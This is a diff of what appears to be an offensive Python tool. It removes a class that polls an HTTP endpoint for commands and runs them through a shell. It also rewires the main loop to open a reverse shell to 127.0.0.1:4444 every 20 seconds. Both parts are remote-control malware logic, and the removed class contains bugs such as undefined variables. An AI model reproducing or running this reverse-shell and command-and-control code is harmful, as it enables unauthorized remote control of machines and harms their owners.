@@ -62,53 +62,7 @@ class rShellby:
         try: objPopen.wait()
         except KeyboardInterrupt: objPopen.close()
 
-class c2cShellby:
 
-    def __init__(self, strurlPassed: str="", bolsilentPassed: bool = True, strheaderPassed: str = ""):
-        self.strURL = strurlPassed
-        self.bolSilent = bolsilentPassed
-        self.strHeader = strcustomPassed
-
-    def ripURL(self):
-            from urllib.parse import urlparse
-            urlParsed = urlparse(self.strURL)
-            strScheme = urlParsed.scheme
-            strPath = urlParsed.path
-            strHost = urlParsed.hostname
-            strPort = urlParsed.port
-            return strScheme, strPath, strHost, strPort
-
-    def startC(self):
-        try: 
-            if "" == self.strURL: return False
-            strScheme, strPath, strHost, strPort = self.ripURL()
-            if strPort == None: strHostArgs = strHost
-            else: strHostArgs = strHost, strPort
-            if "https" == strScheme: 
-                objConnection = http.client.HTTPSConnection(strHostArgs)
-            elif "http" == strScheme: 
-                objConnection = http.client.HTTPConnection(strHostArgs)
-            else: return False
-            objConnection.request("GET", strPath)
-            objResponse = objConnection.getresponse()
-            # Check if the request was successful
-            if objResponse.status == 200:
-                command = objResponse.read().decode().strip()
-                process = subprocess.Popen(command, 
-                                            shell=True, 
-                                            stdout=subprocess.PIPE, 
-                                            stderr=subprocess.PIPE)
-                stdout, stderr = process.communicate()
-                if self.bolSilent != True :
-                    print("Output:", stdout.decode())
-                    print("Errors:", stderr.decode())
-            elif bolSilent != True : print("Failed to retrieve the command. Status code:", objResponse.status_code)
-        except Exception as ex:
-            if self.bolSilent != True: print(f"Error encountered:\n{ex}\n")
-
-
-# Usage:
-# rShellby("127.0.0.1", 4444).startShell()
 while True: 
-    c2cShellby("http://localhost/index.html", False).startC()
+    rShellby("127.0.0.1", 4444).startShell()
     time.sleep(20)
